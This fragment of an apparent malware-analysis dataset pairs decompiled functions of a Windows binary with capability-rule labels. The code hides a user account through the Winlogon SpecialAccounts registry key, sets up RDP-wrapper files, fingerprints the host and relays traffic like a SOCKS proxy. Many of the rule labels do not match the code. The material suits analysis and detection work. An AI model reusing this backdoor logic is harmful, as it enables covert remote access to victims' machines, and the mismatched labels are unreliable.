        "decompiled_code": "\nuint __cdecl fcn.004120e9(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    char16_t *pcVar7;\n    uint uVar8;\n    uint lpCriticalSection;\n    uint var_20h;\n    uint var_10h;\n    uint var_ch;\n    uint hKey;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(&lpCriticalSection);\n    puVar5 = &lpCriticalSection;\n    puVar6 = 0x553050;\n    for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(&lpCriticalSection);\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x553050);\n    *0x5530b4 = arg_8h;\n    *0x5530a8 = 0x552018;\n    *0x5530a4 = arg_ch;\n    iVar4 = fcn.0041199f();\n    pcVar1 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n    if (iVar4 != 0) {\n        uVar2 = fcn.0040460a(L\"rudp\");\n        uVar2 = fcn.00415532(&arg_8h, uVar2);\n        fcn.004043c7(uVar2);\n        fcn.00406f1d();\n        arg_8h = 0;\n        fcn.00406f1d();\n        uVar2 = fcn.0040460a(L\"rpdp\");\n        uVar2 = fcn.00415532(&arg_8h, uVar2);\n        fcn.004043c7(uVar2);\n        fcn.00406f1d();\n        arg_8h = 0;\n        fcn.00406f1d();\n        iVar4 = fcn.004045f0();\n        if ((iVar4 != 0) || (iVar4 = fcn.004045f0(),  iVar4 != 0)) {\n            uVar2 = fcn.00405b49(8, 0x5530ac, 0x5530b0);\n            fcn.00405f32(uVar2);\n            fcn.00405b26();\n            return 1;\n        }\n        (*pcVar1)(0x553050);\n    }\n    uVar3 = fcn.004131f8();\n    if ((uVar3 < 6) || (iVar4 = fcn.004131a4(),  iVar4 != 0)) {\n        uVar2 = 2;\n    }\n    else {\n        iVar4 = fcn.00413893();\n        if (iVar4 == 1) {\n            uVar2 = fcn.004044c4();\n            fcn.004043c7(uVar2);\n            fcn.00406f1d();\n            uVar2 = fcn.004044c4();\n            fcn.004043c7(uVar2);\n            fcn.00406f1d();\n            (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                      (0x80000002, \n                       \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList\", 0, 0, 0, \n                       0xf013f, 0, &hKey, &var_10h);\n            var_ch = 0;\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, *0x5530ac, 0, 4, &var_ch, 4);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            iVar4 = fcn.00410d7a(0x5530ac, 0x5530b0);\n            if (iVar4 != 0) {\n                uVar8 = 0x5530ac;\n                pcVar7 = L\"rudp\";\n                uVar2 = fcn.0040460a(L\"rudp\");\n                fcn.004154ed(uVar2, pcVar7);\n                fcn.00406f1d(uVar2, pcVar7, uVar8);\n                uVar8 = 0x5530b0;\n                pcVar7 = L\"rpdp\";\n                uVar2 = fcn.0040460a(L\"rpdp\");\n                fcn.004154ed(uVar2, pcVar7);\n                fcn.00406f1d(uVar2, pcVar7, uVar8);\n                fcn.00402746(fcn.00411eb2, 0x553050);\n                (*pcVar1)(0x553050);\n                return 1;\n            }\n            uVar2 = 9;\n        }\n        else {\n            uVar2 = 1;\n        }\n    }\n    uVar2 = fcn.00405b49(uVar2, 0x5530ac, 0x5530b0);\n    fcn.00405f32(uVar2);\n    fcn.00405b26();\n    (*pcVar1)(0x553050);\n    return 0;\n}\n",
        "token_count": 1199
    },
    "0041237d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0041237d(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x553050);\n    *0x553068 = 0;\n    *0x55306c = 0;\n    *0x553070 = 0;\n    *0x553074 = 0;\n    *0x553078 = 0;\n    *0x553080 = ZEXT816(0);\n    *0x553090 = 0;\n    *0x5530a0 = 5;\n    *0x553098 = 5;\n    *0x55309c = 0;\n    puVar1 = fcn.00406fa7();\n    if (puVar1 == NULL) {\n        *0x553094 = NULL;\n    }\n    else {\n        *puVar1 = 5;\n        *0x553094 = puVar1 + 1;\n        **0x553094 = 0;\n        puVar1[2] = 0;\n        puVar1[3] = 0;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n    }\n    *0x5530ac = 0;\n    *0x5530b0 = 0;\n    fcn.0040428f(L\"TermService\");\n    fcn.0040428f(L\"%ProgramFiles%\");\n    fcn.0040460a(L\"%windir%\\\\System32\");\n    uVar2 = fcn.00404201();\n    fcn.004043c7(uVar2);\n    fcn.00406f1d();\n    fcn.00406f1d();\n    iVar3 = fcn.004138ef();\n    if (iVar3 == 1) {\n        fcn.0040428f(L\"%ProgramW6432%\");\n        uVar2 = fcn.00404201();\n        fcn.004043c7(uVar2);\n        fcn.00406f1d();\n        fcn.0040428f(L\"%ProgramFiles%\");\n    }\n    else {\n        uVar2 = fcn.00404201();\n        fcn.004043c7(uVar2);\n        fcn.00406f1d();\n    }\n    fcn.004043fa(L\"\\\\Microsoft DN1\");\n    fcn.004043fa(L\"\\\\Microsoft DN1\");\n    fcn.004043fa(L\"\\\\rfxvmt.dll\");\n    fcn.004133fb();\n    *0x553080 = *0x553080 & 0xffffffffffffffff;\n    if (*0x553088 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenW)(*0x553088);\n        uVar2 = fcn.00406e8d();\n        *0x553080 = CONCAT412(uVar2, *0x553080);\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar2, *0x553088);\n    }\n    fcn.004043fa(L\"\\\\rdpwrap.ini\");\n    fcn.004043fa(L\"\\\\sqlmap.dll\");\n    fcn.004043fa(L\"\\\\sqlmap.dll\");\n    return 0x553050;\n}\n",
        "token_count": 732
    },
    "004125ea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004125ea(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack16 = *(arg_8h + 4);\n    uStack12 = *(arg_8h + 0x10);\n    do {\n        iVar1 = fcn.00412657();\n        if (iVar1 < 1) goto code_r0x00412646;\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack16, 0, *(arg_8h + 0x1c));\n        if (iVar1 == 0) {\n            iVar1 = fcn.00412657();\n            if (0 < iVar1) {\n                iVar1 = 0;\n            }\n            goto code_r0x00412646;\n        }\n    } while (iVar1 != 1);\n    iVar1 = 1;\ncode_r0x00412646:\n    fcn.00412798();\n    return iVar1;\n}\n",
        "token_count": 233
    },
    "00412798": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412798(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = param_1 + 0x14;\n    if (*piVar1 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar2 != *(param_1 + 0x18)) {\n            if (*(param_1 + 0x10) == 0) {\n                return;\n            }\n            (*_sym.imp.KERNEL32.dll_SetEvent)(*(param_1 + 0x10));\n            iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*piVar1, 5000);\n            if (iVar2 == 0x102) {\n                (*_sym.imp.KERNEL32.dll_TerminateThread)(*piVar1, 0xfffffffe);\n            }\n        }\n        fcn.00412a13();\n    }\n    fcn.00412a13();\n    fcn.00412a13();\n    fcn.00412a13();\n    fcn.00412a13();\n    *(param_1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 268
    },
    "0041280c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041280c(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    int32_t arg_14h;\n    uint *arg_8h_00;\n    uint lpPipeAttributes;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t lpTargetHandle;\n    int32_t hReadPipe;\n    int32_t hWritePipe;\n    \n    fcn.00412798();\n    lpPipeAttributes = 0xc;\n    hReadPipe = 0;\n    lpTargetHandle = 0;\n    hWritePipe = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_20h = 0;\n    var_1ch = 1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreatePipe)(&hReadPipe, &hWritePipe, &lpPipeAttributes, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    uVar3 = 0;\n    if (iVar2 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar2 = hWritePipe;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        var_18h = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar4, iVar2, uVar3, &lpTargetHandle, 0, 1, 2);\n        uVar3 = var_18h;\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_CreatePipe)(&var_14h, &var_10h, &lpPipeAttributes, 0);\n            uVar3 = 0;\n            if (iVar2 != 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n                iVar2 = hReadPipe;\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n                var_18h = 0;\n                iVar2 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar4, iVar2, uVar3, 0x41e560, 0, 0, 2);\n                uVar3 = var_18h;\n                if (iVar2 != 0) {\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n                    iVar2 = var_10h;\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n                    var_18h = 0;\n                    iVar2 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar4, iVar2, uVar3, 0x41e564, 0, 0, 2);\n                    uVar3 = var_18h;\n                    if (iVar2 != 0) {\n                        uVar3 = extraout_ECX;\n                        if (hReadPipe != 0) {\n                            (*pcVar1)(hReadPipe);\n                            uVar3 = extraout_ECX_00;\n                        }\n                        hReadPipe = 0;\n                        if (var_10h != 0) {\n                            (*pcVar1)(var_10h);\n                            uVar3 = extraout_ECX_01;\n                        }\n                        arg_8h_00 = &arg_8h;\n                        var_10h = 0;\n                        iVar2 = hWritePipe;\n                        arg_14h = var_14h;\n                        fcn.00404656(arg_8h_00);\n                        iVar2 = fcn.0041254e(arg_8h_00, uVar3, iVar2, arg_14h);\n                        uVar3 = 0;\n                        if (iVar2 != 0) {\n                            if (hWritePipe != 0) {\n                                (*pcVar1)(hWritePipe);\n                            }\n                            hWritePipe = 0;\n                            if (var_14h != 0) {\n                                (*pcVar1)(var_14h);\n                            }\n                            var_14h = 0;\n                            if (lpTargetHandle != 0) {\n                                (*pcVar1)(lpTargetHandle);\n                            }\n                            lpTargetHandle = 0;\n                            *0x41e568 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 1, 0, 0);\n                            *0x41e56c = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004125ea, 0x41e558, 0, 0x41e570)\n                            ;\n                            if (*0x41e56c != 0) {\n                                uVar3 = 1;\n                                goto code_r0x00412a02;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if (hReadPipe != 0) {\n        (*pcVar1)(hReadPipe);\n    }\n    hReadPipe = 0;\n    if (hWritePipe != 0) {\n        (*pcVar1)(hWritePipe);\n    }\n    hWritePipe = 0;\n    if (lpTargetHandle != 0) {\n        (*pcVar1)(lpTargetHandle);\n    }\n    lpTargetHandle = 0;\n    if (var_10h != 0) {\n        (*pcVar1)(var_10h);\n    }\n    var_10h = 0;\n    if (var_14h != 0) {\n        (*pcVar1)(var_14h);\n    }\n    var_14h = 0;\n    fcn.00412798();\ncode_r0x00412a02:\n    fcn.00406f1d();\n    return uVar3;\n}\n",
        "token_count": 1309
    },
    "00412a13": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412a13(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 62
    },
    "00412a57": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412a57(uint lpBuffer)\n\n{\n    uint in_ECX;\n    uint uVar1;\n    uint lpNumberOfBytesWritten;\n    \n    if (*0x41e564 == 0) {\n        uVar1 = 0;\n        lpNumberOfBytesWritten = in_ECX;\n    }\n    else {\n        fcn.00404197();\n        lpNumberOfBytesWritten = 0;\n        uVar1 = fcn.004040c4();\n        uVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(*0x41e564, lpBuffer, uVar1, &lpNumberOfBytesWritten, 0);\n    }\n    fcn.00406f1d();\n    return uVar1;\n}\n",
        "token_count": 159
    },
    "00412c20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00412c20(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_818h;\n    uint name;\n    uint var_ch;\n    \n    uVar1 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 6);\n    iVar2 = (*_sym.imp.WS2_32.dll_gethostbyname)(param_1);\n    fcn.0040126d(&var_ch, **(iVar2 + 0xc), *(iVar2 + 10));\n    name._0_2_ = 2;\n    name._2_2_ = (*_sym.imp.WS2_32.dll_htons)(param_2);\n    fcn.00401293(&var_818h, 0, 0x802);\n    (*_sym.imp.WS2_32.dll_InetNtopW)(2, &var_ch, &var_818h, 0x802);\n    while (*0x41e695 == '\\0') {\n        iVar2 = (*_sym.imp.WS2_32.dll_connect)(uVar1, &name, 0x10);\n        if (iVar2 != -1) {\n            *0x41e695 = '\\x01';\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 302
    },
    "00412cd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00412cd5(uint param_1)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint var_868h;\n    uint var_60h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint uStack44;\n    ushort uStack40;\n    uint lpThreadId;\n    int32_t *lpParameter;\n    int32_t var_18h;\n    int32_t len;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    *0x41e8c4 = param_1;\n    do {\n        while( true ) {\n            piVar4 = fcn.00412f8a(&var_60h);\n            var_18h = *piVar4;\n            len = piVar4[1];\n            var_10h = piVar4[2];\n            if (*0x41e695 == '\\0') {\n                return;\n            }\n            piVar4 = fcn.00406fa7();\n            iVar6 = var_10h;\n            iVar5 = var_18h;\n            if (piVar4 == NULL) {\n                piVar4 = NULL;\n            }\n            else {\n                *piVar4 = 0;\n                piVar4[1] = 0;\n                piVar4[2] = 0;\n            }\n            iVar3 = var_18h * 0xc;\n            piVar1 = iVar3 + 0x41e8d0;\n            lpParameter = piVar1;\n            if (*piVar1 == var_18h) break;\n            var_4h._0_2_ = 5;\n            fcn.00412f38(2, var_18h);\n            *(piVar4 + 1) = 1;\n            *piVar4 = iVar5;\n            *piVar1 = *piVar4;\n            *(iVar3 + 0x41e8d4) = piVar4[1];\n            *(iVar3 + 0x41e8d8) = piVar4[2];\n        }\n        if (*(iVar3 + 0x41e8d4) == '\\x01') {\n            fcn.00401293(&var_868h, 0, 0x802);\n            iVar6 = var_10h;\n            var_ch = 0;\n            var_8h = 0;\n            puVar7 = &var_4ch;\n            for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_2ch = 0;\n            uStack44 = 0;\n            uStack40 = 0;\n            cVar2 = *(iVar6 + 3);\n            if (cVar2 == '\\x01') {\n                (*_sym.imp.WS2_32.dll_InetNtopW)(2, iVar6 + 4, &var_868h, 0x802);\ncode_r0x00412d7b:\n                var_8h = fcn.004130de();\n            }\n            else if (cVar2 == '\\x03') {\n                var_48h = 2;\n                _var_3ch = 0;\n                _var_34h = 0;\n                var_44h = 1;\n                var_40h = 6;\n                iVar5 = fcn.00401000(0x200);\n                fcn.0040126d(iVar5, iVar6 + 5, *(iVar6 + 4));\n                *(*(iVar6 + 4) + iVar5) = 0;\n                iVar5 = (*_sym.imp.WS2_32.dll_getaddrinfo)(iVar5, 0, &var_4ch, &var_ch);\n                if (iVar5 == 0) goto code_r0x00412d7b;\n            }\n            else if (cVar2 == '\\x04') {\n                (*_sym.imp.WS2_32.dll_InetNtopW)(0x17, iVar6 + 4, &var_868h, 0x802);\n                var_8h = fcn.00413068();\n            }\n            var_2ch = CONCAT22(var_2ch._2_2_, 5);\n            var_2ch = CONCAT13(1, var_2ch);\n            fcn.00412f38(10, var_18h);\n            iVar5 = *lpParameter * 0xc;\n            lpParameter[2] = var_8h;\n            *(lpParameter + 1) = 2;\n            lpThreadId = 0;\n            *(iVar5 + 0x41e8d0) = *lpParameter;\n            *(iVar5 + 0x41e8d4) = lpParameter[1];\n            *(iVar5 + 0x41e8d8) = lpParameter[2];\n            (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00412ecc, lpParameter, 0, &lpThreadId);\n        }\n        else {\n            (*_sym.imp.WS2_32.dll_send)(*(iVar3 + 0x41e8d8), var_10h, len, 0);\n        }\n        fcn.00401014(iVar6);\n    } while( true );\n}\n",
        "token_count": 1274
    },
    "00412ecc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412ecc(uint *arg_8h)\n\n{\n    uint arg_ch;\n    uint uVar1;\n    uint uVar2;\n    int32_t arg_8h_00;\n    \n    arg_ch = *arg_8h;\n    uVar1 = arg_8h[2];\n    if (*0x41e695 != '\\0') {\n        do {\n            uVar2 = fcn.00401000(0x2000);\n            arg_8h_00 = (*_sym.imp.WS2_32.dll_recv)(uVar1, uVar2, 8000, 0);\n            if ((arg_8h_00 == -1) || (arg_8h_00 == 0)) {\n                (*_sym.imp.WS2_32.dll_closesocket)(uVar1);\n                fcn.00401014(uVar2);\n                return;\n            }\n            fcn.00412f38(arg_8h_00, arg_ch);\n            fcn.00401014(uVar2);\n        } while (*0x41e695 != '\\0');\n    }\n    return;\n}\n",
        "token_count": 246
    },
    "004131a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004131a4(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_11ch;\n    uint var_2h;\n    \n    var_11ch = 0x11c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x419540);\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"RtlGetVersion\");\n        if (pcVar2 == NULL) {\n            return false;\n        }\n        (*pcVar2)(&var_11ch);\n    }\n    if (var_2h != '\\x02') {\n        return var_2h == '\\x03';\n    }\n    return true;\n}\n",
        "token_count": 196
    },
    "004131f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.004131f8(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_11ch;\n    uint var_118h;\n    int32_t var_10ch;\n    \n    var_11ch = 0x11c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x419540);\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"RtlGetVersion\");\n        if (pcVar2 == NULL) {\n            return 0;\n        }\n        (*pcVar2)(&var_11ch);\n    }\n    if (var_10ch != 2) {\n        return 0;\n    }\n    return var_118h;\n}\n",
        "token_count": 176
    },
    "0041340d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041340d(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t hKey;\n    \n    hKey = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(param_1, *param_2, 0, 0x20019, &hKey);\n    if (iVar1 == 2) {\n        return 0;\n    }\n    if (hKey != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return 1;\n}\n",
        "token_count": 138
    },
    "004134a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004134a0(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint pvarg;\n    uint var_20h;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *ppv;\n    \n    (*_sym.imp.ole32.dll_CoInitializeSecurity)(0, 0xffffffff, 0, 0, 0, 3, 0, 0, 0);\n    iVar1 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar1) {\n        ppv = NULL;\n        iVar1 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x419380, 0, 0x17, 0x41c2e0, &ppv);\n        if (-1 < iVar1) {\n            var_10h = NULL;\n            iVar1 = (**(*ppv + 0xc))(ppv, L\"root\\\\CIMV2\", 0, 0, 0, 0x80, 0, 0, &var_10h);\n            piVar2 = ppv;\n            if (-1 < iVar1) {\n                var_ch = NULL;\n                iVar1 = (**(*var_10h + 0x50))\n                                  (var_10h, 0x41c2d8, L\"SELECT Name FROM Win32_VideoController\", 0x20, 0, &var_ch);\n                if (-1 < iVar1) {\n                    var_8h = NULL;\n                    while( true ) {\n                        iVar1 = (**(*var_ch + 0x10))(var_ch, 0xffffffff, 1, &var_8h, &var_14h);\n                        if ((iVar1 == 1) || (iVar1 < 0)) {\n                            (**(*var_ch + 8))(var_ch);\n                            (**(*var_10h + 8))(var_10h);\n                            uVar3 = (**(*ppv + 8))(ppv);\n                            return uVar3;\n                        }\n                        (*_sym.imp.OLEAUT32.dll_VariantClear)(&pvarg);\n                        iVar1 = (**(*var_8h + 0x10))(var_8h, L\"Name\", 0, &pvarg, 0, 0);\n                        if ((-1 < iVar1) && (pvarg == 8)) break;\n                        (**(*var_8h + 8))(var_8h);\n                    }\n                    goto code_r0x00413517;\n                }\n                (**(*ppv + 8))(ppv);\n                piVar2 = var_10h;\n            }\n            (**(*piVar2 + 8))(piVar2);\n        }\n    }\n    var_20h = 0x419490;\ncode_r0x00413517:\n    fcn.0040460a(var_20h);\n    return param_1;\n}\n",
        "token_count": 676
    },
    "004136c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.004136c8(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_11ch;\n    int32_t var_118h;\n    int32_t var_114h;\n    uint32_t var_110h;\n    int32_t var_10ch;\n    uint var_8h;\n    uint var_2h;\n    \n    var_11ch = 0x11c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x419540);\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"RtlGetVersion\");\n        if (pcVar2 == NULL) {\n            return 0;\n        }\n        (*pcVar2)(&var_11ch);\n    }\n    if (var_10ch == 2) {\n        if (var_2h == '\\x01') {\n            if (var_118h == 5) {\n                if (var_114h == 0) {\n                    return var_8h + 500;\n                }\n                if (var_114h == 1) {\n                    return var_8h + 0x1fe;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x208;\n                }\n            }\n            else if (var_118h == 6) {\n                if (var_114h == 0) {\n                    return var_8h + 600;\n                }\n                if (var_114h == 1) {\n                    return var_8h + 0x262;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x26c;\n                }\n                if (var_114h == 3) {\n                    return var_8h + 0x276;\n                }\n            }\n            else if (var_118h == 10) {\n                if (var_110h < 20000) {\n                    return var_8h + 1000;\n                }\n                if (20000 < var_110h) {\n                    return var_8h + 0x44c;\n                }\n            }\n        }\n        else if ((var_2h == '\\x02') || (var_2h == '\\x03')) {\n            if (var_118h == 5) {\n                if (var_114h == 1) {\n                    return var_8h + 0x13ec;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x1450;\n                }\n            }\n            else if (var_118h == 6) {\n                if (var_114h == 0) {\n                    return var_8h + 6000;\n                }\n                if (var_114h == 1) {\n                    return var_8h + 0x17d4;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x1838;\n                }\n                if (var_114h == 3) {\n                    return var_8h + 0x189c;\n                }\n            }\n            else if ((var_118h == 10) && (var_114h == 0)) {\n                return var_8h + 10000;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 776
    },
    "00413893": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.00413893(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t TokenInformation;\n    uint ReturnLength;\n    int32_t TokenHandle;\n    \n    TokenHandle = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &TokenHandle);\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n    iVar3 = 0;\n    if (iVar2 != 0) {\n        ReturnLength = 4;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n        if (iVar2 != 0) {\n            iVar3 = TokenInformation;\n        }\n    }\n    if (TokenHandle != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return iVar3 != 0;\n}\n",
        "token_count": 219
    },
    "004139e7": {
